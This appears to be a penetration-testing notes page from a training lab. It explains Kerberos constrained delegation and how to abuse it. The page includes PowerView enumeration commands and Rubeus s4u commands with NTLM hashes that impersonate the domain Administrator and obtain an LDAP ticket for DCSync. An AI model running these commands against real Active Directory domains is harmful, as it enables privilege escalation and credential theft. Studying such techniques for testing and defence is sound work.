---
description: >-
  Allows the first hop server (web server in our example) to request access only
  to specified services on specified computers.
---

# Constrained Delegation

## About

1. A user - Joe, authenticates to the web service \(running with service account websvc\) using a non-Kerberos compatible authentication mechanism. 
2. The web service requests a ticket from the Key Distribution Center \(KDC\) for Joe's account without supplying a password, as the websvc account. 
3. The KDC checks the websvc userAccountControl value for the TRUSTED\_TO\_AUTHENTICATE\_FOR\_DELEGATION attribute, and that Joe's account is not blocked for delegation. If OK it returns a forwardable ticket for Joe's account \(S4U2Self\). 
4. The service then passes this ticket back to the KDC and requests a service ticket for the CIFS/dcorp- mssql.dollarcorp.moneycorp.local service. 
5. The KDC checks the msDS-AllowedToDelegateTo field on the websvc account. If the service is listed it will return a service ticket for dcorp-mssql \(S4U2Proxy\). 
6. The web service can now authenticate to the CIFS on dcorp- mssql as Joe using the supplied TGS.

![](../../.gitbook/assets/image%20%2810%29.png)

## Enumeration

To enumerate users with constrained delegation we can use PowerView dev:

```text
Get-DomainUser –TrustedToAuth
Get-DomainComputer –TrustedToAuth
```

## Attack

### Abusing User

Request a TGT for websvc using its NTLM hash to get a TGS for websvc as the Domain Administrator – Administrator. Then the TGS used to access the service specified in the /msdsspn parameter \(which is filesystem on dcopr-mssql\):

```text
.\Rubeus.exe s4u /user:websvc /rc4:cc098f204c5887eaa8253e7c2749156f /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL" /ptt
```

### Abusing Machine

Using service account hash - of machine allowed to delegate.

**/altservice** parameter allows us to run the DCSync attack \(request ldap TGS\)

```text
.\Rubeus.exe s4u /user:dcorp-adminsrv$ /rc4:8c6264140d5ae7d03f7f2a53088a291d /impersonateuser:Administrator /msdsspn:"time/dcorp-dc.dollarcorp.moneycorp.LOCAL" /altservice:ldap /ptt
```

